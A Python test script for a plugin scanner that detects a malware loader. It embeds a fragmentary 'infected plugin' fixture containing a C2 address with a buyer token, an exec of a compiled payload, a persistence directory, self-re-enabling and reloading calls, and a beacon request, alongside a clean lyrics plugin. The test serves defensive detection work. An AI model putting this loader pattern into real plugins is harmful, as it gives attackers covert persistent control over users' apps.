#!/usr/bin/env python3
"""Checks for scripts/scan_nw_loader_iocs.py — infected plugin must be flagged, clean one must not."""
import json
import subprocess
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
TOOL = ROOT / "scripts" / "scan_nw_loader_iocs.py"

INFECTED = '''
__id__ = "femboy_lyricspp_plugin_9d27"
_U = "http://5.129.236.207:5002"
_T = "nw_buyer_fcM_vdFNkqMNzFqtZr-I5KXz"
def _x7a2(self):
    globals()["_NW_SRC"] = payload
    exec(compile(src, "<n>", "exec"), globals())
def guard():
    dirs = filesDir + "/nw_keep"
    ctrl.setPluginEnabled(pid, True, None)
    ctrl.loadPluginFromFile(_local, None)
    _u.urlopen(_U + "/api/v1/rt", headers={"X-Plugin-Token": _T})
'''

CLEAN = '''
__id__ = "lyrics"
import requests
URL = "https://lrclib.net/api/get"
def get(track):
    return requests.get(URL, params={"track_name": track}, timeout=5).json()
'''

with tempfile.TemporaryDirectory() as tmp:
    root = Path(tmp)
    (root / "infected.plugin").write_text(INFECTED, encoding="utf-8")
    (root / "clean.plugin").write_text(CLEAN, encoding="utf-8")

    res = subprocess.run([sys.executable, str(TOOL), str(root), "--json"], capture_output=True, text=True)
    assert res.returncode == 1, res.stdout + res.stderr
    data = json.loads(res.stdout)
    files = {h["file"].split("/")[-1] for h in data["hits"]}
    assert files == {"infected.plugin"}, files
    families = set(data["families"])
    assert {"c2", "persistence", "nw_loader"} <= families, families
    assert data["scanned"] == 2

    clean_dir = root / "clean"
    clean_dir.mkdir()
    (clean_dir / "clean.plugin").write_text(CLEAN, encoding="utf-8")
    res = subprocess.run([sys.executable, str(TOOL), str(clean_dir)], capture_output=True, text=True)
    assert res.returncode == 0, res.stdout
    assert "индикаторов не найдено" in res.stdout

print("scan_nw_loader_iocs: OK")
